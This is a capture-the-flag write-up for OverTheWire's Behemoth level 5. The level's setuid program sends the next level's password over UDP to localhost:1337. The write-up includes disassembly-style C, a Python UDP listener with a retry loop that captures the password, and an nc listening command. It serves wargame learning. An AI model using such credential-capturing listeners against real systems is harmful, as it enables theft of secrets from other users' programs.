# OverTheWire — Behemoth Level 5 → 6

> Goal: Get behemoth6 password from `behemoth5`. Result: **`**********`** (hidden)
> Technique: The program sends the password over **UDP** to `localhost:1337` → listen and catch it.

---

## 1. Connection
```bash
ssh behemoth5@behemoth.labs.overthewire.org -p 2221
```

## 2. Vulnerability — disasm + rodata
```c
f = fopen("/etc/behemoth_pass/behemoth6", "r");   // read behemoth6 password (suid)
... fgets(buf, len, f); ...
he = gethostbyname("localhost");                  // rodata: "localhost"
sock = socket(AF_INET, SOCK_DGRAM, 0);            // UDP
... htons(atoi("1337")) ...                       // rodata: "1337"
sendto(sock, buf, ..., localhost:1337);           // send password via UDP
```
The password is sent as a UDP datagram to `localhost:1337` → if we listen on that port, we catch it.

## 3. Exploit
```bash
# Start UDP listener (port 1337), then run behemoth5
python3 -c '
import socket
s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind(("127.0.0.1",1337))
data,_=s.recvfrom(1024)
open("/tmp/cap5.txt","w").write(data.decode())
' &
sleep 1
for n in 1 2 3; do /behemoth/behemoth5 2>/dev/null; sleep 0.4; done   # UDP fire-and-forget -> retry
sleep 0.5; cat /tmp/cap5.txt
```
Output: the captured 10-character password. (`nc`/`ncat` also available on the server: `nc -ulp 1337`.)


## Lessons
| Topic | Note |
|-------|------|
| Network data leak | Program sends sensitive data to a local socket → listen for it |
| UDP | Connectionless; listener must be ready BEFORE `sendto` (bind first) |
| Port/host detection | From rodata + disasm (`gethostbyname`, `htons`, port string) |
